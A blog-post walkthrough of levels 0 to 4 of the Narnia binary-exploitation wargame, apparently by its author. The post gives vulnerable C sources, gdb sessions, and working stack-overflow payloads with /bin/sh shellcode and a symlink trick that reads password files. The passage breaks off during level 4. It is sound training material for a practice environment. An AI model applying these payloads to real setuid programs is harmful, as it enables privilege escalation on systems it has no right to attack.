<!DOCTYPE html>
<html lang="en">

<head>
            <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="">
        <meta name="author" content="Sven Steinbauer">


        <title>Solving Narnia Part 1</title>

            <link href="/post/index.xml" type="application/atom+xml" rel="alternate" title="Unlogic Atom Feed" />
            <link href="/feed.xml" type="application/rss+xml" rel="alternate" title="Unlogic RSS Feed" />
        <!-- Bootstrap Core CSS -->
        <link href="/theme/css/bootstrap.min.css" rel="stylesheet">

        <!-- Custom CSS -->
        <link href="/theme/css/clean-blog.min.css" rel="stylesheet">

        <!-- Code highlight color scheme -->
            <link href="/theme/css/code_blocks/monokai.css" rel="stylesheet">


        <!-- Custom Fonts -->
        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->



        <meta name="description" content="Next up we take on Narnia. This is a binary exploit centered wargame, so fire up your debuggers and let's smash those stacks. For levels ...">

        <meta name="author" content="Sven Steinbauer">


	                <meta property="og:locale" content="">
		<meta property="og:site_name" content="Unlogic">

	<meta property="og:type" content="article">
            <meta property="article:author" content="Sven Steinbauer" >
	<meta property="og:url" content="/2015/04/08/solving-narnia-part-1/">
	<meta property="og:title" content="Solving Narnia Part 1">
	<meta property="article:published_time" content="2015-04-08 00:00:00+01:00">
            <meta property="og:description" content="Next up we take on Narnia. This is a binary exploit centered wargame, so fire up your debuggers and let's smash those stacks. For levels ...">

            <meta property="og:image" content="/images/keyboard-feature.jpg">
</head>

<body>

    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
        <div class="container-fluid">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header page-scroll">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="/">Unlogic</a>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav navbar-right">

                            <li><a href="/pages/about.html">About</a></li>
                            <li><a href="/pages/all-posts.html">All posts</a></li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container -->
    </nav>

    <!-- Page Header -->
    <header class="intro-header" style="background-image: url('/images/keyboard-feature.jpg')">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>Solving Narnia Part 1</h1>
                        <span class="meta">Posted by
                                <a href="/author/sven-steinbauer.html">Sven Steinbauer</a>
                             on Wed 08 April 2015
                        </span>
                            <span class="meta">Updated on Wed 08 April 2015</span>
                        
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
    <!-- Post Content -->
    <article>
        <p>Next up we take on <a class="reference external" href="http://overthewire.org/wargames/narnia/">Narnia</a>. This is a
binary exploit centered wargame, so fire up your debuggers and let's smash those
stacks. For levels 5, 6, 7, and 8, see <a class="reference external" href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/">part 2</a></p>
<p>All levels are in <code>/narnia</code> and both the binary and the source are provided.</p>
<p>I've not included the passwords here, so you'll have to work through
the exercises yourself (or find them elsewhere :))</p>
<div class="section" id="level-00">
<h2>Level 00 ##</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
        <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val's value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
                <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
        <span class="k">else</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. <code>buf</code> is a
fixed size and is allocated <em>after</em> <code>val</code>. Therefore it sits above <code>val</code> on
the stack. As there is no <a class="reference external" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>
we should be able to write over the end of <code>buf</code> and overwrite what is in memory
at <code>val</code>'s location.</p>
<p>So let's try it</p>
<pre class="code console literal-block">
<span class="gp">narnia0&#64;melinda:/narnia$</span> python -c <span class="s2">&quot;print 'C'*50&quot;</span> <span class="p">|</span> ./narnia0
<span class="go">Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!</span>
</pre>
<p>Right, we can confirm that we are able to change the value of <code>val</code>. Let's
tread a bit more carefully and try to see if we can do it more accurately</p>
<pre class="code console literal-block">
<span class="gp">narnia0&#64;melinda:/narnia$</span> python -c <span class="s2">&quot;print 'C'*20 + 'BBBB'&quot;</span> <span class="p">|</span> ./narnia0
<span class="go">Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!</span>
</pre>
<p>So there is no space between <code>val</code> and <code>buf</code>, therefore 20 characters plus a
further 4 is enough to change val. Let's write in the correct value, reversed of
course because of the endian notation</p>
<pre class="code console literal-block">
<span class="gp">narnia0&#64;melinda:/narnia$</span> python -c <span class="s2">&quot;print 'C'*20 + '\xef\xbe\xad\xde'&quot;</span> <span class="p">|</span> ./narnia0
<span class="go">Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
</span><span class="gp">narnia0&#64;melinda:/narnia$</span>
</pre>
<p>We did it.... but wait, where's the shell? It's closed, that's where it is. We
need to keep it open. The trick is to append the <code>cat</code> command to the input</p>
<pre class="code console literal-block">
<span class="gp">narnia0&#64;melinda:/narnia$</span> <span class="o">(</span>python -c <span class="s2">&quot;print 'C'*20 + '\xef\xbe\xad\xde'&quot;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./narnia0
<span class="go">Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]</span>
</pre>
</div>
<div class="section" id="level-01">
<h2>Level 01 ##</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
    <span class="n">ret</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>So here we need to set an environment variable named <code>EGG</code> to something
we want executed. We can't just pass <code>/bin/bash</code> as it's going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.</p>
<pre class="code console literal-block">
<span class="gp">narnia1&#64;melinda:/narnia$</span> <span class="nb">export</span> <span class="nv">EGG</span><span class="o">=</span><span class="k">$(</span>python -c<span class="s1">'print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;'</span><span class="k">)</span>
<span class="gp">narnia1&#64;melinda:/narnia$</span> ./narnia1
<span class="go">Trying to execute EGG!
</span><span class="gp">$</span> whoami
<span class="go">narnia2
</span><span class="gp">$</span> cat /etc/narnia_pass/narnia2
<span class="go">[password]</span>
</pre>
</div>
<div class="section" id="level-02">
<h2>Level 02 ##</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. <code>narnia2</code> binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.</p>
<p>First we need to work out how much data is needed to overwrite <code>EIP</code>. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my <a class="reference external" href="https://github.com/Svenito/exploit-pattern">pattern generator</a> instead
of metasploit's one. I'll create a payload big enugh to overflow the
buffer and then check the value of <code>EIP</code>. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.</p>
<pre class="code console literal-block">
<span class="go">local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span>
</pre>
<pre class="code console literal-block">
<span class="gp">narnia2&#64;melinda:/narnia$</span> gdb -q narnia2
<span class="go">Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0      0
ecx            0x0      0
edx            0xf7fcb898       -134432616
ebx            0xf7fca000       -134438912
esp            0xffffd640       0xffffd640
ebp            0x65413565       0x65413565
esi            0x0      0
edi            0x0      0
eip            0x37654136       0x37654136
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99</span>
</pre>
<pre class="code console literal-block">
<span class="go">local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.</span>
</pre>
<p>We can control <code>EIP</code> with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let's see where our input ends up:</p>
<pre class="code console literal-block">
<span class="go">(gdb) run $(python -c &quot;print 'a' * 140 + 'b' * 4&quot;)
Starting program: /games/narnia/narnia2 $(python -c &quot;print 'a' * 140 + 'b' * 4&quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650:     0x00000000      0xffffd6e4      0xffffd6f0      0xf7feacea
0xffffd660:     0x00000002      0xffffd6e4      0xffffd684      0x08049768
0xffffd670:     0x0804821c      0xf7fca000      0x00000000      0x00000000
0xffffd680:     0x00000000      0xed18585e      0xd520bc4e      0x00000000
0xffffd690:     0x00000000      0x00000000      0x00000002      0x08048360
0xffffd6a0:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000
0xffffd6b0:     0x00000002      0x08048360      0x00000000      0x08048381
0xffffd6c0:     0x0804845d      0x00000002      0xffffd6e4      0x080484d0
0xffffd6d0:     0x08048540      0xf7feb180      0xffffd6dc      0x0000001c
0xffffd6e0:     0x00000002      0xffffd812      0xffffd828      0x00000000
0xffffd6f0:     0xffffd8b9      0xffffd8cd      0xffffd8dd      0xffffd8f0
0xffffd700:     0xffffd913      0xffffd927      0xffffd930      0xffffd93d
0xffffd710:     0xffffde5e      0xffffde69      0xffffde75      0xffffded3
0xffffd720:     0xffffdeea      0xffffdef9      0xffffdf05      0xffffdf16
0xffffd730:     0xffffdf1f      0xffffdf32      0xffffdf3a      0xffffdf4a
0xffffd740:     0xffffdf80      0xffffdfa0      0xffffdfc0      0x00000000
0xffffd750:     0x00000020      0xf7fdbb60      0x00000021      0xf7fdb000
0xffffd760:     0x00000010      0x1f898b75      0x00000006      0x00001000
0xffffd770:     0x00000011      0x00000064      0x00000003      0x08048034
0xffffd780:     0x00000004      0x00000020      0x00000005      0x00000008
0xffffd790:     0x00000007      0xf7fdc000      0x00000008      0x00000000
0xffffd7a0:     0x00000009      0x08048360      0x0000000b      0x000036b2
0xffffd7b0:     0x0000000c      0x000036b2      0x0000000d      0x000036b2
0xffffd7c0:     0x0000000e      0x000036b2      0x00000017      0x00000000
0xffffd7d0:     0x00000019      0xffffd7fb      0x0000001f      0xffffdfe2
0xffffd7e0:     0x0000000f      0xffffd80b      0x00000000      0x00000000
0xffffd7f0:     0x00000000      0x00000000      0xe8000000      0x7c03ba19
0xffffd800:     0x2bd0895a      0x3866226d      0x69ad5957      0x00363836
0xffffd810:     0x672f0000      0x73656d61      0x72616e2f      0x2f61696e
0xffffd820:     0x6e72616e      0x00326169      0x61616161      0x61616161
0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd890:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8b0:     0x61616161      0x62626262      0x47445800      0x5345535f
0xffffd8c0:     0x4e4f4953      0x3d44495f      0x30333035      0x45485300
0xffffd8d0:     0x2f3d4c4c      0x2f6e6962      0x68736162      0x52455400
0xffffd8e0:     0x78723d4d      0x322d7476      0x6f633635      0x00726f6c
0xffffd8f0:     0x5f485353      0x45494c43      0x323d544e      0x322e3231
0xffffd900:     0x37352e33      0x3136312e      0x35333320      0x34203932
0xffffd910:     0x53003334      0x545f4853      0x2f3d5954      0x2f766564
0xffffd920:     0x2f737470      0x4c003033      0x4c415f43      0x00433d4c
0xffffd930:     0x52455355      0x72616e3d      0x3261696e      0x5f534c00
0xffffd940:     0x4f4c4f43      0x723d5352      0x3a303d73      0x303d6964
0xffffd950:     0x34333b31      0x3d6e6c3a      0x333b3130      0x686d3a36
0xffffd960:     0x3a30303d      0x343d6970      0x33333b30      0x3d6f733a</span>
</pre>
<p>We see our payload start at <code>0xffffd828</code> with the last 4 bytes at <code>0xffffd8b4</code></p>
<p>The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we'll pad the
start with a <a class="reference external" href="https://en.wikipedia.org/wiki/NOP_slide">nop sled</a> to adjust for
the memory offset introduced by <code>gdb</code>. Then set the <code>EIP</code> to somewhere in the middle
of the sled</p>
<pre class="code console literal-block">
<span class="gp">narnia2&#64;melinda:/narnia$</span> ./narnia2 <span class="sb">`</span>python -c <span class="s2">&quot;print '\x90'*115 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x60\xd8\xff\xff'&quot;</span><span class="sb">`</span>
<span class="gp">$</span> whoami
<span class="go">narnia3
</span><span class="gp">$</span> cat /etc/narnia_pass/narnia3
<span class="go">[password]</span>
</pre>
</div>
<div class="section" id="level-03">
<h2>Level 03 ##</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

        <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>

        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* open files */</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* copy from file1 to file2 */</span>
        <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>

        <span class="cm">/* close 'em */</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>

        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre>
<p>At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don't control the stack,
we control where the file gets written to. <code>/dev/null</code> is not a useful place
for data, and we want the contents of <code>/etc/narnia_pass/narnia4</code>. As <code>narnia3</code> runs
setuid narnia4, it can do that for us.</p>
<p>First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
<code>narnia4</code> that is 32 characters long, and then write that to the target. The issue here
is that the source path's last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:</p>
<pre class="code console literal-block">
<span class="gp">narnia3&#64;melinda:/narnia$</span> mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
<span class="gp">narnia3&#64;melinda:/narnia$</span> ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
</pre>
<p>Now when we pass that to <code>narnia3</code>:</p>
<pre class="code console literal-block">
<span class="gp">narnia3&#64;melinda:/narnia$</span> ./narnia3 <span class="sb">`</span>python -c <span class="s2">&quot;print '/tmp/' + 'x'*27 + '/tmp/narn4'&quot;</span><span class="sb">`</span>
<span class="go">copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
</span><span class="gp">narnia3&#64;melinda:/narnia$</span> cat /tmp/narn4
<span class="go">[password]</span>
</pre>
<p>It's a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That's why we have
the double <code>/tmp</code> setup.</p>
</div>
<div class="section" id="level-04">
<h2>Level 04 ##</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
</span>
<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>MOAR OVERFLOWS. This time you'll notice something at line 6. What this does
is <a class="reference external" href="http://man7.org/linux/man-pages/man7/environ.7.html">store the user environment</a>.
This then get zerod out inside <code>main</code> to prevent us from storing any shellcode
in environment variables. However we might still be able to write <code>EIP</code>, so using the
trusty pattern generator from before</p>
<pre class="code console literal-block">
<span class="go">local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
</pre>
<pre class="code console literal-block">
<span class="gp">narnia4&#64;melinda:/narnia$</span> gdb -q ./narnia4
<span class="go">Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
